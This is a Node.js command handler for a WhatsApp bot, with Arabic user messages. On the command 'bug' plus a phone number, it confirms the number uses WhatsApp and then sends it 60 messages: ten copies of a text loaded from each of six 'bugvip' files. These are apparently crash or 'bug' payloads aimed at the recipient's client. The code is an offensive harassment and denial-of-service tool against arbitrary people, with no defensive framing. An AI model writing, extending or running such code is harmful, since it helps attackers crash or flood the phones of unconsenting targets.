const path = require('path');

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("bug")) return;

  const parts = text.trim().split(' ');
  const number = parts[1];

  if (!number || isNaN(number)) {
    return reply("❌ يرجى كتابة رقم الهاتف بعد الأمر.\nمثال: bug 966xxxxxxxxx");
  }

  const jid = `${number}@s.whatsapp.net`;

  try {
    // ✅ تحقق من أن الرقم موجود على واتساب
    const exists = await sock.onWhatsApp(jid);
    if (!exists || !exists[0]?.exists) {
      return reply("❌ الرقم غير موجود على واتساب.");
    }

    await reply(`⏳ جاري إرسال BUG إلى: ${number}\nيرجى الانتظار...`);

    // ✅ أسماء الملفات التي تحتوي النصوص
    const bugFiles = [
      'bugvip1.js',
      'bugvip2.js',
      'bugvip3.js',
      'bugvip4.js',
      'bugvip5.js',
      'bugvip6.js'
    ];

    for (const file of bugFiles) {
      const { xeontext6 } = require(path.join(__dirname, file));
      for (let i = 0; i < 10; i++) {
        await sock.sendMessage(jid, { text: xeontext6 });
        await new Promise(resolve => setTimeout(resolve, 1500)); // تأخير 1.5 ثانية
      }
    }

    await reply(`✅ تم إرسال جميع الرسائل إلى: ${number}`);

  } catch (err) {
    console.error(err);
    await reply(`❌ فشل في إرسال الرسالة إلى: ${number}`);
  }
};
